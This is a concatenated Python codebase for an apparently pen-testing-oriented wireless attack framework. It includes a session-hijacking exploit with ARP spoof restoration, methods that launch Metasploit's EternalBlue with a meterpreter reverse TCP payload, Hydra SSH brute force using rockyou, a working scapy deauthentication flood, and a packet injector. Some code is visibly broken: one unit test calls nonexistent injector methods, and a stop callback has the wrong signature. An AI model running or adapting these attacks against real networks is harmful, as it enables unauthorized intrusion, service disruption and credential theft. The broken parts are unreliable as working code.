        self.logger.info("Cleaning up Session Hijacking exploit.")

        # Signal all processes to stop
        self.stop_event.set()

        # Terminate all child processes
        for process in self.processes:
            if process.is_alive():
                process.terminate()
                process.join(timeout=5)
                if process.is_alive():
                    self.logger.warning(f"Process PID {process.pid} did not terminate gracefully. Killing it.")
                    process.kill()
                    process.join()
                self.logger.debug(f"Process PID {process.pid} has been terminated.")

        # Restore ARP tables if not using real-time processing
        if not self.real_time:
            self._restore_arp()

        # Reset interface to managed mode if it was changed
        self._reset_interface()

        # Generate report
        self.generate_report()

        self.logger.info("Session Hijacking exploit and monitoring stopped.")

    def _restore_arp(self):
        """
        Restore the normal ARP tables by sending correct ARP replies.
        """
        self.logger.info("Restoring ARP tables.")
        try:
            # Send the correct ARP information to the target and gateway
            send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=self.target_mac, hwdst="ff:ff:ff:ff:ff:ff"),
                 count=5, iface=self.interface, verbose=False)
            send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=self.gateway_mac, hwdst="ff:ff:ff:ff:ff:ff"),
                 count=5, iface=self.interface, verbose=False)
            self.logger.info("ARP tables restored successfully.")
        except Exception as e:
            self.logger.exception(f"Failed to restore ARP tables: {e}")

    def _reset_interface(self):
        """
        Reset the network interface to managed mode if it was changed.
        """
        try:
            mode = self.core.packet_handler.packet_injector.get_interface_mode()
            if mode == 'monitor':
                self.logger.info(f"Setting interface {self.interface} back to managed mode.")
                subprocess.check_call(['airmon-ng', 'stop', self.interface],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.logger.info(f"Interface {self.interface} set back to managed mode.")
            else:
                self.logger.debug(f"Interface {self.interface} is already in managed mode.")
        except subprocess.CalledProcessError as e:
            self.logger.warning(f"Failed to reset interface {self.interface} to managed mode: {e}")
        except Exception as e:
            self.logger.exception(f"Unexpected error while resetting interface: {e}")

    def generate_report(self, report_file: str = "session_hijack_report.json"):
        """
        Generates a comprehensive JSON report of the findings.

        Args:
            report_file (str): Path to save the report file.
        """
        self.logger.info(f"Generating report: {report_file}")
        try:
            report_data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'vulnerability_info': self.vulnerability,
                'analysis_results': list(self.analysis_results),
                'interface': self.interface,
                'capture_file': self.capture_file if not self.real_time else "Real-time processing enabled",
            }

            with open(report_file, 'w') as f:
                json.dump(report_data, f, indent=4)

            self.logger.info(f"Report generated successfully at {report_file}")
        except Exception as e:
            self.logger.exception(f"Failed to generate report: {e}")

    def generate_html_report(self, template_file: str = "report_template.html", report_file: str = "session_hijack_report.html"):
        """
        Generates a comprehensive HTML report of the findings using a Jinja2 template.

        Args:
            template_file (str): Path to the HTML template file.
            report_file (str): Path to save the HTML report file.
        """
        self.logger.info(f"Generating HTML report: {report_file}")
        try:
            # Setup Jinja2 environment
            env = Environment(loader=FileSystemLoader('.'))
            template = env.get_template(template_file)

            report_data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'vulnerability_info': self.vulnerability,
                'analysis_results': list(self.analysis_results),
                'interface': self.interface,
                'capture_file': self.capture_file if not self.real_time else "Real-time processing enabled",
            }

            # Render the template with data
            report_html = template.render(report_data)

            # Save the report
            with open(report_file, 'w') as f:
                f.write(report_html)

            self.logger.info(f"HTML report generated successfully at {report_file}")
        except Exception as e:
            self.logger.exception(f"Failed to generate HTML report: {e}")

    def perform_network_scan(self, scan_file: str = "nmap_scan.xml"):
        """
        Performs an Nmap scan on the target IP and saves the results.

        Args:
            scan_file (str): Path to save the Nmap scan results.
        """
        self.logger.info(f"Starting Nmap scan on {self.target_ip}")
        try:
            cmd = [
                'nmap',
                '-sS',                # SYN scan
                '-O',                 # OS detection
                '-p-',                # Scan all ports
                '-oX', scan_file,     # Output in XML format
                self.target_ip
            ]
            subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.logger.info(f"Nmap scan completed. Results saved to {scan_file}")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Nmap scan failed: {e}")
        except Exception as e:
            self.logger.exception(f"Unexpected error during Nmap scan: {e}")

    def perform_metasploit_exploit(self, module: str, payload: str, lhost: str, lport: int, output_file: str = "metasploit_output.txt"):
        """
        Executes a Metasploit module with specified parameters.

        Args:
            module (str): Metasploit module path.
            payload (str): Payload to use.
            lhost (str): Local host IP for payload.
            lport (int): Local port for payload.
            output_file (str): Path to save Metasploit output.
        """
        self.logger.info(f"Starting Metasploit exploit using module {module}")
        try:
            cmd = [
                'msfconsole',
                '-q',  # Quiet mode
                '-x', f"use {module}; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; exploit; exit"
            ]
            with open(output_file, 'w') as f:
                subprocess.run(cmd, check=True, stdout=f, stderr=subprocess.STDOUT)
            self.logger.info(f"Metasploit exploit completed. Output saved to {output_file}")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Metasploit exploit failed: {e}")
        except Exception as e:
            self.logger.exception(f"Unexpected error during Metasploit exploit: {e}")

    def perform_hydra_attack(self, service: str, username: str, password_file: str, target_ip: str, output_file: str = "hydra_output.txt"):
        """
        Executes a Hydra brute-force attack on a specified service.

        Args:
            service (str): Service to target (e.g., ssh, ftp).
            username (str): Username to target.
            password_file (str): Path to password list file.
            target_ip (str): IP address of the target.
            output_file (str): Path to save Hydra output.
        """
        self.logger.info(f"Starting Hydra attack on {service} service at {target_ip}")
        try:
            cmd = [
                'hydra',
                '-l', username,
                '-P', password_file,
                service,
                target_ip,
                '-o', output_file
            ]
            subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.logger.info(f"Hydra attack completed. Results saved to {output_file}")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Hydra attack failed: {e}")
        except Exception as e:
            self.logger.exception(f"Unexpected error during Hydra attack: {e}")



def main():
    # Configure logging
    logging.basicConfig(level=logging.DEBUG,
                        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

    # Define fake vulnerability information
    vulnerability_info = {
        'target_ip': '192.168.1.10',
        'gateway_ip': '192.168.1.1',
        'channel': 6
    }

    # Define custom filter expression (optional)
    custom_filter = "tcp port 80"  # Example: Capture only HTTP traffic

    # Initialize core framework with mock implementation
    core = CoreFramework(modules_path=".", interface='wlan0')

    # Initialize the exploit with fake test data
    exploit = SessionHijacking(
        core_framework=core,
        vulnerability=vulnerability_info,
        max_packets=5,  # Reduced number for testing
        interval=1.0,   # Short interval for testing
        capture_file="session_hijack_capture.pcap",
        filter_expression=custom_filter,
        real_time=True
    )

    # Execute the exploit
    result = exploit.execute()
    print(result)

    if result.get("status") != "success":
        print("Exploit failed to start. Exiting.")
        return

    # Run the exploit and monitoring for a short duration (e.g., 10 seconds for testing)
    try:
        run_duration = 10  # seconds
        start_time = time.time()
        while (time.time() - start_time) < run_duration:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Interrupted by user.")

    # Cleanup after the attack
    exploit.cleanup()

    print("Session Hijacking and monitoring completed.")

    # Perform additional mock actions post-exploit
    exploit.perform_network_scan(scan_file="nmap_scan.xml")
    exploit.perform_metasploit_exploit(
        module="exploit/windows/smb/ms17_010_eternalblue",
        payload="windows/meterpreter/reverse_tcp",
        lhost="192.168.1.100",
        lport=4444,
        output_file="metasploit_eternalblue.txt"
    )
    exploit.perform_hydra_attack(
        service="ssh",
        username="admin",
        password_file="/usr/share/wordlists/rockyou.txt",
        target_ip="192.168.1.10",
        output_file="hydra_ssh.txt"
    )

    # Generate reports
    exploit.generate_report("final_session_hijack_report.json")
    exploit.generate_html_report(template_file="report_template.html", report_file="final_session_hijack_report.html")

    print("Network scan, exploits, and reporting completed.")


if __name__ == "__main__":
    main()

# exploits/wep_exploit.py
from core import CoreFramework
from exploits.base_exploit import BaseExploit


class WEPExploit(BaseExploit):
    """
    An exploit to crack WEP keys.
    """
    def __init__(self):
        super().__init__()
        self.logger = self.set_logger("WEPExploit")


    def run(self, core_framework: CoreFramework, target_info=None):
        """
        Run the WEP exploit.

        Args:
            core_framework (CoreFramework): The core framework instance.
            target_info (dict): Information about the target network.

        Returns:
            dict: Exploit results.
        """
        self.logger.info("Running WEP exploit...")
        return {
            "BSSID": target_info.get("BSSID"),
            "Description": "WEP key cracked!",
            "Action": "Connect to the network using the cracked key."
       }


if __name__=="__main__":
    core_framework = CoreFramework()
    exploit = WEPExploit()
    exploit.run(core_framework, target_info={"BSSID": "00:11:22:33:44:55"})

# exploits/__init__.py


# modules/__init__.py


# modules/attack_modules/deauth_attack.py
# core/modules/attack_modules/deauth_attack.py

from scapy.all import *
import threading
from typing import List

from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth


class DeauthAttack:
    def __init__(self, interface: str, target_bssid: str, target_client: str = None, stop_event: threading.Event = None):
        """
        Initializes the DeauthAttack.

        Args:
            interface (str): The network interface to send deauth packets on.
            target_bssid (str): The BSSID of the target access point.
            target_client (str, optional): The MAC address of the target client. If None, broadcast to all clients.
            stop_event (threading.Event, optional): Event to signal stopping the attack.
        """
        self.interface = interface
        self.target_bssid = target_bssid
        self.target_client = target_client
        self.stop_event = stop_event or threading.Event()

    def send_deauth_packets(self):
        """
        Sends deauthentication packets in a loop until stopped.
        """
        while not self.stop_event.is_set():
            pkt = RadioTap()/Dot11(addr1=self.target_client if self.target_client else 'ff:ff:ff:ff:ff:ff',
                                   addr2=self.target_bssid,
                                   addr3=self.target_bssid)/Dot11Deauth(reason=7)
            sendp(pkt, iface=self.interface, verbose=0)
            time.sleep(0.1)  # Adjust the rate as needed

    def start_attack(self):
        """
        Starts the deauthentication attack in a separate thread.
        """
        attack_thread = threading.Thread(target=self.send_deauth_packets, daemon=True)
        attack_thread.start()

    def stop_attack(self):
        """
        Signals the attack to stop.
        """
        self.stop_event.set()


# modules/attack_modules/__init__.py


# modules/credential_attacks/__init__.py


# modules/data_analytics/report_generator.py
# core/modules/data_analytics/report_generation.py

import json
import csv
from fpdf import FPDF
import matplotlib.pyplot as plt
import seaborn as sns
from typing import Dict, Any, List

class ReportGenerator:
    def __init__(self, scan_results: Dict[str, Any], exploit_results: Dict[str, Any], report_data: Dict[str, Any]):
        """
        Initializes the ReportGenerator.

        Args:
            scan_results (Dict[str, Any]): Results from network scans.
            exploit_results (Dict[str, Any]): Results from exploit modules.
            report_data (Dict[str, Any]): Additional data for the report.
        """
        self.scan_results = scan_results
        self.exploit_results = exploit_results
        self.report_data = report_data

    def generate_pdf_report(self, file_path: str):
        """
        Generates a PDF report.

        Args:
            file_path (str): Path to save the PDF report.
        """
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", 'B', 16)
        pdf.cell(40, 10, "Wireless Penetration Test Report")
        pdf.ln(20)

        # Scan Results
        pdf.set_font("Arial", 'B', 12)
        pdf.cell(40, 10, "Scan Results")
        pdf.ln(10)
        pdf.set_font("Arial", '', 10)
        for ap in self.scan_results.get('access_points', []):
            pdf.cell(0, 10, f"SSID: {ap['SSID']}, BSSID: {ap['BSSID']}, Security: {ap['Security']}")
            pdf.ln(5)

        # Exploit Results
        pdf.set_font("Arial", 'B', 12)
        pdf.cell(40, 10, "Exploit Results")
        pdf.ln(10)
        pdf.set_font("Arial", '', 10)
        for exploit in self.exploit_results.get('exploits', []):
            pdf.cell(0, 10, f"Exploit: {exploit['name']}, Status: {exploit['status']}")
            pdf.ln(5)

        # Save PDF
        pdf.output(file_path)

    def export_json(self, file_path: str):
        """
        Exports report data to a JSON file.

        Args:
            file_path (str): Path to save the JSON file.
        """
        with open(file_path, 'w') as f:
            json.dump({
                'scan_results': self.scan_results,
                'exploit_results': self.exploit_results,
                'additional_data': self.report_data
            }, f, indent=4)

    def export_csv(self, file_path: str):
        """
        Exports report data to a CSV file.

        Args:
            file_path (str): Path to save the CSV file.
        """
        with open(file_path, 'w', newline='') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(['SSID', 'BSSID', 'Security'])
            for ap in self.scan_results.get('access_points', []):
                writer.writerow([ap['SSID'], ap['BSSID'], ap['Security']])


# modules/data_analytics/__init__.py


# modules/machine_learning/anomaly_detection.py
# core/modules/machine_learning/anomaly_detection.py

import pandas as pd
from sklearn.ensemble import IsolationForest
from typing import List, Dict

class AnomalyDetector:
    def __init__(self, data: pd.DataFrame):
        """
        Initializes the AnomalyDetector.

        Args:
            data (pd.DataFrame): The dataset for anomaly detection.
        """
        self.data = data
        self.model = IsolationForest(contamination=0.05)

    def train_model(self):
        """
        Trains the anomaly detection model.
        """
        self.model.fit(self.data)

    def detect_anomalies(self) -> pd.DataFrame:
        """
        Detects anomalies in the dataset.

        Returns:
            pd.DataFrame: Data containing anomalies.
        """
        self.data['anomaly'] = self.model.predict(self.data)
        anomalies = self.data[self.data['anomaly'] == -1]
        return anomalies


# modules/machine_learning/device_fingerprinting.py


# modules/machine_learning/__init__.py


# modules/network_enumeration/beacon_analyzer.py
# core/modules/network_enumeration/beacon_analysis.py

from scapy.all import *
import threading
from typing import List, Dict

from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11


class BeaconAnalyzer:
    """
    Analyzes beacon frames to detect nearby access points
    """
    def __init__(self, interface: str, stop_event: threading.Event):
        """
        Initializes the BeaconAnalyzer.

        Args:
            interface (str): The network interface to capture packets on.
            stop_event (threading.Event): Event to signal stopping the packet capture.
        """
        self.interface = interface
        self.stop_event = stop_event
        self.access_points: Dict[str, Dict[str, Any]] = {}

    def start_capture(self):
        """
        Starts capturing beacon frames on the specified interface.
        """
        sniff(iface=self.interface, prn=self.process_packet, stop_filter=self.should_stop)

    def should_stop(self, packet) -> bool:
        """
        Determines whether to stop packet capturing.

        Args:
            packet: The captured packet.

        Returns:
            bool: True if capture should stop, False otherwise.
        """
        return self.stop_event.is_set()

    def process_packet(self, packet):
        """
        Processes each captured packet.

        Args:
            packet: The captured packet.
        """
        if packet.haslayer(Dot11Beacon):
            bssid = packet[Dot11].addr3
            ssid = packet[Dot11Elt].info.decode(errors='ignore')
            capabilities = packet.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}").split('+')
            timestamp = packet.time

            if bssid not in self.access_points:
                self.access_points[bssid] = {
                    'SSID': ssid,
                    'Capabilities': capabilities,
                    'Last Seen': timestamp
                }
            else:
                self.access_points[bssid]['Last Seen'] = timestamp

    def get_access_points(self) -> List[Dict[str, Any]]:
        """
        Retrieves the list of detected access points.

        Returns:
            List[Dict[str, Any]]: A list of access point details.
        """
        return list(self.access_points.values())

    def run(self):
        """
        Runs the packet capture in a separate thread.
        """
        capture_thread = threading.Thread(target=self.start_capture, daemon=True)
        capture_thread.start()


# modules/network_enumeration/hidden_ssid_reveal.py
# core/modules/network_enumeration/hidden_ssid_reveal.py

from scapy.all import *
import threading
from typing import List, Dict

from scapy.layers.dot11 import Dot11ProbeReq, Dot11, Dot11Elt


class HiddenSSIDRevealer:
    def __init__(self, interface: str, stop_event: threading.Event):
        self.interface = interface
        self.stop_event = stop_event
        self.hidden_ssids: Dict[str, Dict[str, Any]] = {}

    def start_capture(self):
        sniff(iface=self.interface, prn=self.process_packet, stop_filter=self.should_stop)

    def should_stop(self) -> bool:
        return self.stop_event.is_set()

    def process_packet(self, packet):
        if packet.haslayer(Dot11ProbeReq):
            mac = packet[Dot11].addr2
            ssid = packet[Dot11Elt].info.decode(errors='ignore')
            timestamp = packet.time

            if ssid == "":
                ssid = "Hidden SSID"
            if mac not in self.hidden_ssids:
                self.hidden_ssids[mac] = {
                    'SSID': ssid,
                    'Last Seen': timestamp
                }
            else:
                self.hidden_ssids[mac]['Last Seen'] = timestamp

    def get_hidden_ssids(self) -> List[Dict[str, Any]]:
        return list(self.hidden_ssids.values())

    def run(self):
        capture_thread = threading.Thread(target=self.start_capture, daemon=True)
        capture_thread.start()


# modules/network_enumeration/signal_heatmap.py
# core/modules/network_enumeration/signal_heatmap.py

from scapy.all import *
import threading
import matplotlib.pyplot as plt
import seaborn as sns
from typing import List, Dict

from scapy.layers.dot11 import Dot11Beacon, Dot11


class SignalHeatmap:
    def __init__(self, interface: str, stop_event: threading.Event):
        self.interface = interface
        self.stop_event = stop_event
        self.signal_data: Dict[str, List[int]] = {}  # BSSID: List of signal strengths

    def start_capture(self):
        sniff(iface=self.interface, prn=self.process_packet, stop_filter=self.should_stop)

    def should_stop(self, packet) -> bool:
        return self.stop_event.is_set()

    def process_packet(self, packet):
        if packet.haslayer(Dot11Beacon):
            bssid = packet[Dot11].addr3
            signal_strength = packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else 0
            if bssid not in self.signal_data:
                self.signal_data[bssid] = []
            self.signal_data[bssid].append(signal_strength)

    def get_average_signals(self) -> Dict[str, float]:
        return {bssid: sum(signals)/len(signals) for bssid, signals in self.signal_data.items()}

    def generate_heatmap(self):
        average_signals = self.get_average_signals()
        bssids = list(average_signals.keys())
        signals = list(average_signals.values())

        plt.figure(figsize=(10, len(bssids)*0.5))
        sns.heatmap([signals], annot=True, fmt=".1f", cmap="coolwarm",
                    xticklabels=bssids, yticklabels=["Signal Strength (dBm)"])
        plt.title("Signal Strength Heatmap")
        plt.xlabel("BSSID")
        plt.ylabel("")
        plt.show()

    def run(self):
        capture_thread = threading.Thread(target=self.start_capture, daemon=True)
        capture_thread.start()


# modules/network_enumeration/__init__.py


# modules/wireless_protocols/__init__.py


# packet_handler/base_packet_handler.py
from scapy.all import *
import logging
from abc import ABC, abstractmethod

# Base Handler Class
class PacketHandler(ABC):
    def __init__(self, event_dispatcher, next_handler=None):
        self.event_dispatcher = event_dispatcher
        self.next_handler = next_handler
        self.logger = logging.getLogger(self.__class__.__name__)

    @abstractmethod
    def handle(self, packet):
        pass

# packet_handler/packet_analyzer.py
# Concrete Handlers
from scapy.all import *
import logging
from scapy.layers.dot11 import Dot11Elt, Dot11Deauth, Dot11Beacon, Dot11
from scapy.layers.inet import UDP, TCP
from scapy.layers.l2 import Ether
from .base_packet_handler import PacketHandler
from scapy.all import Raw
from scapy.layers.inet import IP


class Dot11BeaconHandler(PacketHandler):
    """
    A handler to process Dot11 Beacon frames.
    """
    def handle(self, packet):
        if packet.haslayer(Dot11Beacon):
            dot11 = packet.getlayer(Dot11)
            ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore')
            bssid = dot11.addr3
            self.logger.info(f"Beacon Frame - SSID: {ssid}, BSSID: {bssid}")
            self.event_dispatcher.dispatch('beacon_detected', ssid=ssid, bssid=bssid)
        elif self.next_handler:
            self.next_handler.handle(packet)

class Dot11DeauthHandler(PacketHandler):
    """
    A handler to process Dot11 Deauth frames.
    """
    def handle(self, packet):
        if packet.haslayer(Dot11Deauth):
            dot11 = packet.getlayer(Dot11)
            reason = packet[Dot11Deauth].reason
            addr1 = dot11.addr1
            addr2 = dot11.addr2
            bssid = dot11.addr3
            self.logger.info(f"Deauth Frame - Addr1: {addr1}, Addr2: {addr2}, BSSID: {bssid}, Reason: {reason}")
            self.event_dispatcher.dispatch('deauth_detected', addr1=addr1, addr2=addr2, bssid=bssid, reason=reason)
        elif self.next_handler:
            self.next_handler.handle(packet)

class Dot11ProbeRequestHandler(PacketHandler):
    """
    A handler to process Dot11 Probe Request frames.
    """
    def handle(self, packet):
        if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 4:
            dot11 = packet.getlayer(Dot11)
            ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore') if packet.haslayer(Dot11Elt) else ''
            client_mac = dot11.addr2
            self.logger.info(f"Probe Request - SSID: {ssid}, Client MAC: {client_mac}")
            self.event_dispatcher.dispatch('probe_request_detected', ssid=ssid, client_mac=client_mac)
        elif self.next_handler:
            self.next_handler.handle(packet)

class EtherHandler(PacketHandler):
    """
    A handler to process Ethernet frames.
    """
    def handle(self, packet):
        if packet.haslayer(Ether):
            eth_layer = packet.getlayer(Ether)
            self.logger.info(f"Ethernet Frame - Source MAC: {eth_layer.src}, Destination MAC: {eth_layer.dst}")
            # Continue to next handler if needed
        if self.next_handler:
            self.next_handler.handle(packet)

class IPHandler(PacketHandler):
    """
    A handler to process IP packets.
    """
    def handle(self, packet):
        if packet.haslayer(IP):
            ip_layer = packet.getlayer(IP)
            self.logger.info(f"IP Packet - Source IP: {ip_layer.src}, Destination IP: {ip_layer.dst}, TTL: {ip_layer.ttl}")
            # Continue to next handler if needed
        if self.next_handler:
            self.next_handler.handle(packet)

class TCPHandler(PacketHandler):
    """
    A handler to process TCP segments.
    """
    def handle(self, packet):
        if packet.haslayer(TCP):
            tcp_layer = packet.getlayer(TCP)
            self.logger.info(f"TCP Segment - Source Port: {tcp_layer.sport}, Destination Port: {tcp_layer.dport}, Flags: {tcp_layer.flags}")
            # Continue to next handler if needed
        elif self.next_handler:
            self.next_handler.handle(packet)

class UDPHandler(PacketHandler):
    """
    A handler to process UDP datagrams.
    """
    def handle(self, packet):
        if packet.haslayer(UDP):
            udp_layer = packet.getlayer(UDP)
            self.logger.info(f"UDP Datagram - Source Port: {udp_layer.sport}, Destination Port: {udp_layer.dport}")
            # Continue to next handler if needed
        elif self.next_handler:
            self.next_handler.handle(packet)

class RawDataHandler(PacketHandler):
    """
    A handler to process raw data in packets.
    """
    def handle(self, packet):
        if packet.haslayer(Raw):
            raw_data = packet.getlayer(Raw).load
            self.logger.info(f"Raw Data: {raw_data}")
            # Continue to next handler if needed
        if self.next_handler:
            self.next_handler.handle(packet)

# PacketAnalyzer Using Chain of Responsibility
class PacketAnalyzer:
    """
    A packet analyzer that uses the Chain of Responsibility pattern to process packets.
    """
    def __init__(self, event_dispatcher):
        self.logger = logging.getLogger(self.__class__.__name__)
        self.event_dispatcher = event_dispatcher
        self.handler_chain = self.build_handler_chain()

    def build_handler_chain(self):
        # Build the chain by linking handlers
        raw_data_handler = RawDataHandler(self.event_dispatcher)
        udp_handler = UDPHandler(self.event_dispatcher, next_handler=raw_data_handler)
        tcp_handler = TCPHandler(self.event_dispatcher, next_handler=udp_handler)
        ip_handler = IPHandler(self.event_dispatcher, next_handler=tcp_handler)
        ether_handler = EtherHandler(self.event_dispatcher, next_handler=ip_handler)
        probe_request_handler = Dot11ProbeRequestHandler(self.event_dispatcher, next_handler=ether_handler)
        deauth_handler = Dot11DeauthHandler(self.event_dispatcher, next_handler=probe_request_handler)
        beacon_handler = Dot11BeaconHandler(self.event_dispatcher, next_handler=deauth_handler)
        return beacon_handler  # Start of the chain

    def analyze_packet(self, packet):
        self.logger.debug(f"Analyzing packet: {packet.summary()}")
        self.handler_chain.handle(packet)


# packet_handler/packet_injector.py
import time

import scapy.packet
from scapy.all import *
import logging
import threading

class PacketInjector:
    """
    A class to handle packet injection using Scapy.
    """
    def __init__(self, interface='wlan0mon'):
        self.interface = interface
        self.logger = logging.getLogger(self.__class__.__name__)
        self.injecting = False
        self.inject_thread = None

    def send_packet(self, packet, count=1, inter=0.1):
        """
        Sends a crafted packet.

        :param packet: Scapy packet to send.
        :param count: Number of times to send the packet.
        :param inter: Interval between packet sends.
        """
        self.logger.info(f"Sending packet: {packet.summary()} | Count: {count} | Interval: {inter}s")
        try:
            sendp(packet, iface=self.interface, count=count, inter=inter, verbose=False)
            self.logger.info("Packet sent successfully.")
        except Exception as e:
            self.logger.error(f"Failed to send packet: {e}")

    def send_continuous(self, packet, interval=0.1):
        """
        Continuously sends a crafted packet at specified intervals.

        :param packet: Scapy packet to send.
        :param interval: Time between sends in seconds.
        """
        self.injecting = True
        self.inject_thread = threading.Thread(target=self._inject_loop, args=(packet, interval))
        self.inject_thread.start()
        self.logger.info("Started continuous packet injection.")

    def _inject_loop(self, packet, interval):
        while self.injecting:
            try:
                sendp(packet, iface=self.interface, count=1, inter=0, verbose=False)
                self.logger.debug(f"Injected packet: {packet.summary()}")
                time.sleep(interval)
            except Exception as e:
                self.logger.error(f"Error during packet injection: {e}")

    def stop_continuous(self):
        """
        Stops continuous packet injection.
        """
        self.injecting = False
        if self.inject_thread and self.inject_thread.is_alive():
            self.inject_thread.join()
            self.logger.info("Stopped continuous packet injection.")


# packet_handler/packet_sniffer.py
from scapy.all import sniff
import logging
import threading

class PacketSniffer:
    """
    A class to handle packet sniffing using Scapy.
    """
    def __init__(self, interface='wlan0mon', filter=None, prn=None):
        """
        Initializes the PacketSniffer.

        :param interface: Wireless interface in monitor mode.
        :param filter: BPF filter string.
        :param prn: Callback function to process each packet.
        """
        self.interface = interface
        self.filter = filter
        self.prn = prn
        self.logger = logging.getLogger(self.__class__.__name__)
        self.sniffing = False
        self.sniff_thread = None

    def start_sniffing(self):
        """
        Starts packet sniffing in a separate thread.
        """
        self.sniffing = True
        self.sniff_thread = threading.Thread(target=self._sniff)
        self.sniff_thread.start()
        self.logger.info("Started packet sniffing.")

    def _sniff(self):
        """
        Internal method to perform sniffing.
        """
        try:
            sniff(iface=self.interface, filter=self.filter, prn=self.prn, stop_filter=lambda x: not self.sniffing)
        except Exception as e:
            self.logger.error(f"Error during packet sniffing: {e}")

    def stop_sniffing(self):
        """
        Stops packet sniffing.
        """
        self.sniffing = False
        if self.sniff_thread and self.sniff_thread.is_alive():
            self.sniff_thread.join()
            self.logger.info("Stopped packet sniffing.")


# packet_handler/__init__.py
def headers():
    return None

# packet_handler/tests/test_packet_analyzer.py
import unittest
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap
from scapy.layers.inet import IP, TCP, UDP
import logging
from scapy.layers.dot11 import Dot11Deauth
from scapy.layers.l2 import Ether
from scapy.all import Raw
from packet_handler.packet_analyzer import PacketAnalyzer


class MockEventDispatcher:
    def __init__(self):
        self.events = []

    def dispatch(self, event_name, **kwargs):
        self.events.append((event_name, kwargs))


class TestPacketAnalyzer(unittest.TestCase):
    def setUp(self):
        self.event_dispatcher = MockEventDispatcher()
        self.packet_analyzer = PacketAnalyzer(self.event_dispatcher)
        self.logger = logging.getLogger('PacketAnalyzerTest')
        logging.basicConfig(level=logging.INFO)

    def test_beacon_handler(self):
        # Create a mock Beacon frame
        ssid = 'TestNetwork'
        beacon_packet = RadioTap() / Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                                           addr2='00:11:22:33:44:55',
                                           addr3='00:11:22:33:44:55') / Dot11Beacon() / Dot11Elt(ID='SSID', info=ssid)
        self.packet_analyzer.analyze_packet(beacon_packet)

        # Check if the event was dispatched
        self.assertIn(('beacon_detected', {'ssid': ssid, 'bssid': '00:11:22:33:44:55'}), self.event_dispatcher.events)

    def test_deauth_handler(self):
        # Create a mock Deauthentication frame
        deauth_packet = RadioTap() / Dot11(type=0, subtype=12, addr1='00:11:22:33:44:66',
                                           addr2='00:11:22:33:44:55', addr3='00:11:22:33:44:55') / Dot11Deauth(reason=3)
        self.packet_analyzer.analyze_packet(deauth_packet)

        # Check if the event was dispatched
        expected_event = ('deauth_detected',
                          {'addr1': '00:11:22:33:44:66', 'addr2': '00:11:22:33:44:55', 'bssid': '00:11:22:33:44:55',
                           'reason': 3})
        self.assertIn(expected_event, self.event_dispatcher.events)

    def test_probe_request_handler(self):
        # Create a mock Probe Request frame
        ssid = 'TestProbe'
        probe_packet = RadioTap() / Dot11(type=0, subtype=4, addr1='ff:ff:ff:ff:ff:ff',
                                          addr2='00:11:22:33:44:77', addr3='ff:ff:ff:ff:ff:ff') / Dot11Elt(ID='SSID',
                                                                                                           info=ssid)
        self.packet_analyzer.analyze_packet(probe_packet)

        # Check if the event was dispatched
        expected_event = ('probe_request_detected', {'ssid': ssid, 'client_mac': '00:11:22:33:44:77'})
        self.assertIn(expected_event, self.event_dispatcher.events)

    def test_ether_handler(self):
        # Create a mock Ethernet frame
        ether_packet = Ether(src='00:11:22:33:44:55', dst='66:77:88:99:aa:bb')
        self.packet_analyzer.analyze_packet(ether_packet)
        # Since EtherHandler doesn't dispatch events, we'll check the logs or ensure no errors occur

    def test_ip_handler(self):
        # Create a mock IP packet
        ip_packet = IP(src='192.168.1.1', dst='192.168.1.2')
        self.packet_analyzer.analyze_packet(ip_packet)
        # Similar to EtherHandler, check logs or no exceptions

    def test_tcp_handler(self):
        # Create a mock TCP segment
        tcp_packet = IP(src='192.168.1.1', dst='192.168.1.2') / TCP(sport=12345, dport=80, flags='S')
        self.packet_analyzer.analyze_packet(tcp_packet)
        # Check logs or no exceptions

    def test_udp_handler(self):
        # Create a mock UDP datagram
        udp_packet = IP(src='192.168.1.1', dst='192.168.1.2') / UDP(sport=12345, dport=53)
        self.packet_analyzer.analyze_packet(udp_packet)
        # Check logs or no exceptions

    def test_raw_data_handler(self):
        # Create a mock packet with Raw data
        raw_data = b'This is some raw data'
        raw_packet = IP(src='192.168.1.1', dst='192.168.1.2') / Raw(load=raw_data)
        self.packet_analyzer.analyze_packet(raw_packet)
        # Check logs or no exceptions

    def tearDown(self):
        self.event_dispatcher.events.clear()


if __name__ == '__main__':
    unittest.main()


# packet_handler/tests/test_packet_injector.py

import unittest
from scapy.packet import Packet
from packet_handler.packet_injector import PacketInjector


class EthernetHeader:
    pass


class IPHeader:
    pass


class UDPHeader:
    pass


class TestPacketInjector(unittest.TestCase):
    def test_inject_packet(self):
        # Create a packet
        packet = Packet()
        packet.add_header(EthernetHeader())
        packet.add_header(IPHeader())
        packet.add_header(UDPHeader())

        # Create a packet injector
        injector = PacketInjector()

        # Inject the packet
        injector.inject_packet(packet)

        # Check if the packet was injected
        self.assertEqual(injector.get_injected_packet(), packet)

if __name__ == '__main__':
    unittest.main()

# project_specific_utils/authentication_tools.py
# wireless_pen_test_lib/project_specific_utils/authentication_tools.py

import logging

class AuthenticationTools:
    """
    A class to provide authentication-related tools.
    """
    def __init__(self):
        """
        Initialize the AuthenticationTools.
        """
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.info("AuthenticationTools initialized.")

